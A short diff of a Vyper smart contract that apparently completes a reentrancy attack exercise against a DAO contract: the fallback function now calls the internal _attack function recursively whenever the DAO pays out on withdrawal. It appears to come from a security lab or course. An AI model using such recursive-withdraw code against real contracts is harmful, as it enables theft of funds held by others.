@@ -17,6 +17,7 @@ def __init__():
     self.owner_address = ZERO_ADDRESS
 
 @internal
+@payable
 def _attack() -> bool:
     assert self.dao_address != ZERO_ADDRESS
     
@@ -50,7 +51,5 @@ def attack(dao_address:address):
 @payable
 def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
-    
     # TODO: Add code here to complete the recursive call
-    log DefaultCall(msg.sender, msg.value)
     self._attack()
